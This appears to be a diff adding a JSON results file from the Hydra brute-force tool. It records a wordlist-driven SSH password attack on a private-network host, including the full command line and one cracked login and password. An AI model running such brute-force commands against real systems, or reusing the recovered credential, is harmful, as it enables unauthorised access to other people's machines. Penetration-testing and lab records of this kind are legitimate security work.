@@ -1,0 +1,23 @@
+{
+  "generator": {
+    "software": "Hydra",
+    "version": "v9.0",
+    "built": "2022-03-28 14:23:01",
+    "server": "10.18.191.136",
+    "service": "ssh",
+    "jsonoutputversion": "1.00",
+    "commandline": "hydra -L /root/default/user.txt -P /root/default/passwd.txt -s 22 -t 4 -b json -o /root/result/616.json 10.18.191.136 ssh"
+  },
+  "results": [
+    {
+      "port": 22,
+      "service": "ssh",
+      "host": "10.18.191.136",
+      "login": "zen",
+      "password": "163453"
+    }
+  ],
+  "success": true,
+  "errormessages": [],
+  "quantityfound": 1
+}
